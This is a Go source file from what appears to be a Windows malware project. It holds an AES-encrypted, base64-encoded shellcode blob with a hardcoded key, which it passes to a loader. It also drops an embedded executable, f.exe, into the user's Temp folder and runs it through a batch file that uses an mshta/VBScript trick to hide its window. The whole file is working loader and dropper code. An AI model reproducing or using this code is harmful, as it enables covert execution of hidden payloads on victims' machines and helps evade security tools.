package tj

import (
	"embed"
	"github.com/ha1yu/win-tj-free/utils"
	"io/ioutil"
	"log"
	"time"
)

//go:embed f.exe
var embededFiles embed.FS

var windowsScript = `
@echo off
%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
%s
`

func TjRun() {

	key := "woshikeywoshikey"
	shellCodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMtU9h81o3KF2VPs+oicVFimWavTH+69bTKfsh6A/9aeErSWSQO3h7EgSWhFiqIKBJcXRDXkQAzWorcyUF0AKdJaozS3dVUfNZ+h3rVb6BOsajsw3Dmy/6dJ5wDvCl9E/ZMn23jvLYTWW/kcFoPZcXYilxfyyGqoN1KEH0l3bTlpY4w508dsiJZ46H53rnpbnyKVUSW4Np8wvQZycYzqvU8SK4jyLiY5aZ3kBC0CvULta2kTV2ZIVABrzEzUX9A9bFSMOnPIrKxncrSO8h2QQbi/8+mlc2U/AarkSuQMSYtSOyO4WiydAePKVarYNC2eQfmLEJa1kKnpDaig/4tnpbSWt/RTeybRiqCEEHpHKh44JFCdHBnpWP7g1DdWQ3b4C7wB3HcfGB827fnOar4sABKZ5mUD3n5kFfirgnsPIPAE8I5+Kx+ZiJVrZM2Nwn4tG7WONse3tyzq+sbX0QpYPujAyCFgn1yxA+acsvIZ5+uCfjdi1MceCy/sRlS19WUJiDU8atsDQlTHwyZvnJ69/bLntsCdrJGwX8Jlx3Ugt745OuR3HM4FdsvL6xszSvxV265w8vqL12Dsf3O5xLX6oRUrtNKxBHdfcn4teXMsgMTnzJf5JQ5th+laM5yw0qzL2+5M34rvQFZl704EfYBz0lm9ZoIWisiZmQKrfnWUr8kwzMZn6Vy/Gj09RV05UJlOgi+kKGsn3lxICf2aEU3baVwzd8eqSeRyFqchtzaZ7vzdqY3bJeznUQWKplpDYYYQyJE9DhYXgcGay8LX4Tt5nmiSBneduqJ0mjiiAJjsWOUrTbH5FMsZ1U1/cFFoOwUKuFxNUbdvCswR44d9f3BPsrI="

	go loaderRun(key, shellCodeAesBast64)
	flashRun()
	time.Sleep(999999999)
}

func flashRun() {

	bytes, err := embededFiles.ReadFile("f.exe")
	if err != nil {
		log.Println(err)
		return
	}

	err = ioutil.WriteFile(utils.UserLocalAppData()+"/Temp/f.exe", bytes, 0666)
	if err != nil {
		log.Println(err)
		return
	}

	//utils.ExecShell1("" + utils.UserLocalAppData() + "/Temp/f.exe")

	//windowsScript := windowsScript + "\n\r" + utils.UserLocalAppData() + "/Temp/f.exe"
	a := "@echo off\n\r"
	b := "%1 mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"%~s0 ::\",0,FALSE)(window.close)&&exit\n\n"
	c := utils.UserLocalAppData() + "/Temp/f.exe"
	ws := a + b + c
	utils.Write(utils.UserLocalAppData()+"/Temp/1.bat", ws)
	//log.Println(a + b + c)
	utils.ExecShell1(utils.UserLocalAppData() + "/Temp/1.bat")
}
